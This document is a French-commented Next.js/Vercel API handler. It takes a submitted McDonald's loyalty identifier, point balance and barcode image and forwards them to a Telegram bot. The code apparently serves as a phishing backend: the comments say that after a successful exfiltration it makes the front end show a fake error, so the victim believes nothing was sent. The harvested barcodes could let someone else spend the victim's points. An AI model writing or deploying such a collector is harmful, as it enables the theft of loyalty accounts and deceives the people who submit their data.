import formidable from 'formidable-serverless';
import fs from 'fs';
import fetch from 'node-fetch';

export const config = {
  api: {
    bodyParser: false, // nécessaire pour lire le FormData avec formidable
  },
};

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  // Récupérer le token et chat_id depuis les variables d'environnement Vercel
  const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  if (!BOT_TOKEN || !CHAT_ID) {
    console.error('Variables d\'environnement manquantes');
    return res.status(500).json({ error: 'Configuration serveur incorrecte' });
  }

  const form = new formidable.IncomingForm({ multiples: false, keepExtensions: true });
  
  form.parse(req, async (err, fields, files) => {
    if (err) {
      console.error(err);
      return res.status(500).json({ error: 'Erreur lors du parse du formulaire' });
    }

    const identifier = fields.identifier;
    const points = fields.points || 'non renseignés';
    const imageFile = files.image;

    if (!identifier || !imageFile) {
      return res.status(400).json({ error: 'Identifiant ou image manquant' });
    }

    // Lire le fichier image temporaire
    const imageBuffer = fs.readFileSync(imageFile.path);
    const imageBlob = new Blob([imageBuffer], { type: 'image/png' });

    // Préparer l'envoi à Telegram
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', imageBlob, 'barcode.png');
    formData.append('caption', `🆔 IDENTIFIANT : ${identifier}\n🍟 POINTS MCDO : ${points}\n📦 CODE BARRE (CODE128) : ${identifier}`);

    try {
      const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData,
      });
      if (!tgRes.ok) {
        const errorText = await tgRes.text();
        console.error('Telegram API error:', errorText);
        return res.status(500).json({ error: 'Erreur lors de l\'envoi à Telegram' });
      }
      // On renvoie une erreur "factice" pour correspondre à l'attente du front (patch échoué)
      // Mais l'envoi a réussi. Conformément à la consigne, le front affiche "erreur".
      return res.status(200).json({ status: 'sent_but_display_error' });
    } catch (error) {
      console.error(error);
      return res.status(500).json({ error: 'Erreur réseau' });
    } finally {
      // Nettoyer le fichier temporaire
      try { fs.unlinkSync(imageFile.path); } catch(e) {}
    }
  });
}